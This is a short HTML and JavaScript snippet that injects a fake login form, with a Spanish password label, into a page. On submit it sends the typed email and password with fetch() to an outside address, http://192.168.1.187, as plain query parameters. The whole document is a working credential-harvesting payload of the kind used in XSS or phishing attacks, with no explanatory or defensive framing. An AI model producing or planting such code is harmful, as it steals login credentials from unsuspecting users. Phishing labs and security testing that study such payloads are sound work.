<div id="formContainer"></div>

<script>
    var email;
    var password;

    var form =
        '<form>' +
        'Email: <input type="email" id="email" required><br>' +
        'Contraseña: <input type="password" id="password" required><br>' +
        '<input type="button" onclick="submitForm()" value="Submit">' +
        '</form>';

    document.getElementById("formContainer").innerHTML = form;

    function submitForm() {
        email = document.getElementById("email").value;
        password = document.getElementById("password").value;

        fetch("http://192.168.1.187/?email=" + email + "&password=" + password);
    }
</script>

